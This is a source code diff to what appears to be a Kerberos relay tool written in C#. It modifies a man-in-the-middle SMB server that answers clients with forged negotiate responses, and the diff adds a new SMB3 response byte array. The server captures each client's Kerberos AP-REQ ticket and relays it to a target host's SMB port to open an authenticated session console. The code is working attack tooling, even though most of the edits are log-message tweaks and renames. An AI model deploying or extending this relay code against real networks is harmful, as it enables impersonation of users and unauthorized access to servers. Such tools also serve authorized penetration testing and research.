@@ -32,7 +32,7 @@ class SMBCommandSocketConsole
 
     public byte[] apreqBuffer;
     public FakeSMBServer currSocketServer;
-    public  async Task Start(int port, State state, byte[] buffer)
+    public async Task Start(int port, State state, byte[] buffer)
     {
         // Define the IP address and port
 
@@ -45,33 +45,33 @@ class SMBCommandSocketConsole
         {
             // Start the listener
             listener.Start();
-            Console.WriteLine("[*] SMB Console Server started on any:{0}. Waiting for connections...", port);
+            Console.WriteLine("[*] SMB Console Server started on [any:{0}]. Waiting for connections...", port);
 
             //while (true)
             {
                 // Accept a client socket
                 //Socket clientSocket = listener.AcceptTcpClientAsync(); // AcceptSocket(); //AcceptTcpClientAsync()
                 TcpClient clientSocket = await listener.AcceptTcpClientAsync();
-                
-                
-                Console.WriteLine("[*] SMB Console Server connected client:{0}", clientSocket.Client.RemoteEndPoint);
+
+
+                Console.WriteLine("[*] SMB Console Server connected client: [{0}]", clientSocket.Client.RemoteEndPoint);
                 SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                 //smbc.curSocketServer =  currSocketServer;
                 KrbRelay.Clients.Smb smb2 = new Smb(clientSocket.Client);
                 //smbc.currSourceSocket = state.SourceSocket;
                 //smbc.currDestSocket = state.TargetSocket;
                 //smbc.ServerType = State.ServerType;
-                smbc.curSocketServer = currSocketServer;
+                //smbc.curSocketServer = currSocketServer;
                 bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
                 if (!isConnected)
                 {
-                    Console.WriteLine("[-] Could not connect to {0}:445", Program.targetFQDN);
+                    Console.WriteLine("[-] Could not connect to [{0}:445]", Program.targetFQDN);
 
                 }
 
 
 
-                Console.WriteLine("[*] SMB relay Connected to: {0}:445", Program.targetFQDN);
+                Console.WriteLine("[*] SMB relay Connected to: [{0}:445]", Program.targetFQDN);
                 //state.isRelayed = true;
                 //Task.Run(() => smb2.smbConnect(smbc));
                 Task.Run(() => smb2.smbConnect(smbc, buffer));
@@ -141,6 +141,20 @@ public class FakeSMBServer
                                                                 0x13,0x09,0x93,0x27,0xdb,0x6e,0x41,0xee,0xf8,0x14,0x45,0x6e,0xdb,0xfa,0x09,0x8c,
                                                                 0x14,0x87,0xf9,0x4c,0x14,0x73,0xca,0xbd,0xe5,0x20,0x00,0x00,0x02,0x00,0x04,0x00,
                                                                 0x00,0x00,0x00,0x00,0x01,0x00,0x02,0x00};
+    byte[] smb3NegotiateProtocolResponse = new byte[] {0x00, 0x00, 0x01, 0x74, 0xFE, 0x53, 0x4D, 0x42, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00,
+        0x01, 0x00, 0x11, 0x03, 0x05, 0x00, 0x93, 0x6D, 0x4F, 0xE8, 0xB6, 0xD9, 0x23, 0x4A, 0xB5, 0x33, 0x05, 0x98, 0x82, 0xA8, 0xE3, 0xAE, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0xED, 0x25, 0x57, 0x35, 0x15, 0x40, 0xDB, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00,
+        0x78, 0x00, 0xF8, 0x00, 0x00, 0x00, 0x60, 0x76, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x6C, 0x30, 0x6A, 0xA0, 0x3C, 0x30, 0x3A, 0x06, 0x0A, 0x2B, 0x06,
+        0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01,
+        0x02, 0x02, 0x06, 0x0A, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x03, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, 0xA3, 0x2A,
+        0x30, 0x28, 0xA0, 0x26, 0x1B, 0x24, 0x6E, 0x6F, 0x74, 0x5F, 0x64, 0x65, 0x66, 0x69, 0x6E, 0x65, 0x64, 0x5F, 0x69, 0x6E, 0x5F, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
+        0x40, 0x70, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5F, 0x69, 0x67, 0x6E, 0x6F, 0x72, 0x65, 0x01, 0x00, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x01, 0x00,
+        0x72, 0x84, 0xBE, 0xA6, 0x02, 0x97, 0x90, 0xA5, 0xBA, 0x06, 0xCB, 0xF0, 0xF3, 0x7E, 0xFD, 0x60, 0x01, 0x21, 0x66, 0xB8, 0x88, 0x25, 0xE9, 0x55, 0xB0, 0xBD, 0x2C, 0x4A,
+        0x2C, 0x95, 0x52, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x04, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
+        0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00};
 
 
     public FakeSMBServer(int listenPort, string targetHost, int targetPort)
@@ -168,7 +182,8 @@ public class FakeSMBServer
     }
     public void Start(bool fwd)
     {
-        Console.WriteLine("[*] Starting FakeSMBServer on port:{0}", _listenPort);
+        ForwardOnly = fwd;
+        Console.WriteLine($"[*] Starting MiTMServer on port:[{_listenPort}] {(ForwardOnly ? "(Forward Only mode)" : "")} ");
         _listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, _listenPort));
         _listenerSocket.Listen(100); // Allow up to 100 pending connections
@@ -177,14 +192,14 @@ public class FakeSMBServer
         _isRunning = true;
         _listenerSocket.BeginAccept(OnClientConnect, null);
 
-        ForwardOnly = fwd;
+        
 
     }
     public void Stop()
     {
         if (_isRunning)
         {
-            Console.WriteLine("[*] Stopping FakeSMBServer on port:{0}", _listenPort);
+            Console.WriteLine("[*] Stopping MiTMServer on port:[{0}]", _listenPort);
             _isRunning = false;
 
             // Stop listening for new connections
@@ -198,13 +213,13 @@ public class FakeSMBServer
 
             _activeConnections.Clear();
 
-            Console.WriteLine("[*] FakeSMBServer {0} stopped.", _listenPort);
+            Console.WriteLine("[*] MiTMServer [{0}] stopped.", _listenPort);
         }
     }
 
     public void ListConnectedClients()
     {
-        Console.WriteLine("\n[*] Connected Clients on port:{0}", _listenPort);
+        Console.WriteLine("\n[*] Connected Clients on port:[{0}]", _listenPort);
         foreach (var key in _activeConnections.Keys)
         {
             Console.WriteLine($"- {key}");
@@ -221,7 +236,7 @@ public class FakeSMBServer
             // Create a unique key for this connection
             string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";
 
-            Console.WriteLine($"[*] FakeSMBServer:{_listenPort} -> Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode.", _listenPort);
+            Console.WriteLine($"[*] MiTMServer [{_listenPort}]: Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode.", _listenPort);
 
             // Create a new connection to the target server
             Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -268,25 +283,25 @@ public class FakeSMBServer
                     Program.forwdardmode = true;
 
                     state.isRelayed = true;
-                    Console.WriteLine("[*] FakeSMBServer {0}: sending smbNegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
+                    Console.WriteLine("[*] MiTMServer [{0}]: sending smbNegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
                     state.SourceSocket.Send(smbNegotiateProtocolResponse, smbNegotiateProtocolResponse.Length, SocketFlags.None);
                     l = state.SourceSocket.Receive(buffer);
-                    Console.WriteLine("[*] FakeSMBServer {0}: sending smb2NegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
-                    state.SourceSocket.Send(smb2NegotiateProtocolResponse, smb2NegotiateProtocolResponse.Length, SocketFlags.None);
+                    Console.WriteLine("[*] MiTMServer [{0}]: sending smb3NegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
+                    state.SourceSocket.Send(smb3NegotiateProtocolResponse, smb3NegotiateProtocolResponse.Length, SocketFlags.None);
                     l = state.SourceSocket.Receive(buffer);
                     //int ticketOffset = Helpers.PatternAt(buffer, new byte[] { 0x60, 0x82 }); // 0x6e, 0x82, 0x06
                     buffer = buffer.Skip(4).ToArray();
                     Program.apreqBuffer = Program.ExtractSecurityBlob(buffer);
                     if (!(Program.apreqBuffer[0] == 0x60 && Program.apreqBuffer[1] == 0x82))
                     {
-                        Console.WriteLine("[-] FakeSMBServer {0}: Could not find AP-REQ, maybe using NTLM?", state.SourceSocket.RemoteEndPoint);
+                        Console.WriteLine("[-] MiTMServer [{0}]: Could not find AP-REQ, maybe using NTLM?", state.SourceSocket.RemoteEndPoint);
                         state.isRelayed = false;
 
-                        //CloseConnection(state);
+                        CloseConnection(state);
                         return;
 
                     }
-                    Console.WriteLine("[*] FakeSMBServer {0}: Got AP-REQ for : {1}/{2}", state.SourceSocket.RemoteEndPoint, Program.service, Program.targetFQDN);
+                    Console.WriteLine("[*] MiTMServer [{0}]: Got AP-REQ for : {1}/{2}", state.SourceSocket.RemoteEndPoint, Program.service, Program.targetFQDN);
 
 
 
@@ -300,9 +315,9 @@ public class FakeSMBServer
 
                             SMBCommandSocketConsole smbs = new SMBCommandSocketConsole();
                             smbs.currSocketServer = null;
-                            Console.WriteLine("[*] FakeSMBServer {0}: SMB relay socket console Connected to: {1}:445", state.SourceSocket.RemoteEndPoint, Program.targetFQDN);
+                            Console.WriteLine("[*] MiTMServer [{0}]: SMB relay socket console Connected to: [{1}:445]", state.SourceSocket.RemoteEndPoint, Program.targetFQDN);
                             Task.Run(() => smbs.Start(Program.bgconsoleStartPort++, state, Program.apreqBuffer));
-                            
+
                             state.isRelayed = false;
 
                             CloseConnection(state);
@@ -319,16 +334,16 @@ public class FakeSMBServer
                             smbc.currDestSocket = state.TargetSocket;
                             smbc.ServerType = ServerType;
                             smbc.curSocketServer = this;
-                            bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
+                            bool isConnected = smbc.Connect(IPAddress.Parse(Program.RedirectHost) , SMBTransportType.DirectTCPTransport);
                             if (!isConnected)
                             {
-                                Console.WriteLine("[-] Could not connect to {0}:445", Program.targetFQDN);
+                                Console.WriteLine("[-] Could not connect to [{0}:445]", Program.RedirectHost);
 
                             }
 
 
                             state.isRelayed = false;
-                            Console.WriteLine("[*] SMB relay Connected to: {0}:445", Program.targetFQDN);
+                            Console.WriteLine("[*] SMB relay Connected to: [{0}:445]", Program.targetFQDN);
 
 
                             Task.Run(() => smb2.smbConnect(smbc, Program.apreqBuffer));
